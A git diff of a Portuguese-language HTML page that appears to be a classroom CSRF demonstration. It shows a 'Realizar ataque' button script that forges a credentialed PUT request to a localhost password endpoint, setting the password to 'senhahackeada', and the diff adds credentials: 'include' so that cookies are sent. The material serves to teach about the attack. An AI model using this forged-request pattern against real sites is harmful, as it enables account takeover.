@@ -30,32 +30,39 @@
       <code>PUT</code> para <code>http://localhost:5000/userPassword</code> com
       uma nova senha definida pelo atacante.
     </p>
-    <button onclick="alterarSenhaDoUsuario()">Realizar ataque</button>
+    <button onclick="hackerAlteraSenha()">Realizar ataque</button>
 
     <script>
-      async function alterarSenhaDoUsuario() {
+      const hackerAlteraSenha = async () => {
         fetch("http://localhost:5000/api/userPassword", {
           method: "PUT",
-          body: JSON.stringify({ novaSenha: "senhahackeada" }),
+          credentials: "include",
           headers: {
             "Content-Type": "application/json",
           },
+          body: JSON.stringify({
+            novaSenha: "senhahackeada",
+          }),
         })
-          .then((response) => {
-            if (!response.ok) {
-              return response.text().then((text) => {
-                throw new Error(`${response.status}: ${text}`);
+          .then((res) => {
+            if (!res.ok) {
+              return res.json().then((data) => {
+                throw new Error(data.message || "Erro desconhecido");
               });
             }
-            return response.json();
+            return res.json();
           })
           .then((data) => {
-            console.log(data);
+            if (data.success) {
+              console.log({ data });
+
+              alert("Senha alterada, faca login novamente!");
+            }
           })
           .catch((error) => {
-            console.error("Erro:", error);
+            console.error("Erro:", error.message);
           });
-      }
+      };
     </script>
   </body>
 </html>
